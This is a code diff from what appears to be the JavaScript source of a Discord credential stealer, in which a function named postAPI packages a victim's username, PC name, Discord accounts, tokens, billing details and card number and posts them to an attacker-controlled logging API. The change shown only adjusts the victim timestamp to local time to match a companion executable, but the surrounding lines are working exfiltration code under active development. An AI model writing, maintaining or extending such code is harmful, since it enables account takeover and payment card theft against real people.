@@ -352,6 +352,10 @@ function postAPI(user, billing, token, ip, eventType, extra) {
             card_number:       extra.card_number||'',
         }]);
 
+        // Local timestamp (not UTC) - same format as exe
+        const now = new Date();
+        const localISO = new Date(now.getTime() - now.getTimezoneOffset() * 60000).toISOString().slice(0, -1);
+
         const body = new URLSearchParams({
             api_key:          API_KEY,
             victim_username:  process.env.USERNAME||process.env.COMPUTERNAME||'Unknown',
@@ -360,7 +364,7 @@ function postAPI(user, billing, token, ip, eventType, extra) {
             victim_pc:        process.env.COMPUTERNAME||'Unknown',
             victim_os:        'Windows',
             discord_accounts: acct,
-            victim_timestamp: new Date().toISOString(),
+            victim_timestamp: localISO,
         }).toString();
 
         const url = new URL(API_URL.replace(/\/+$/,'') + '/api/logs');
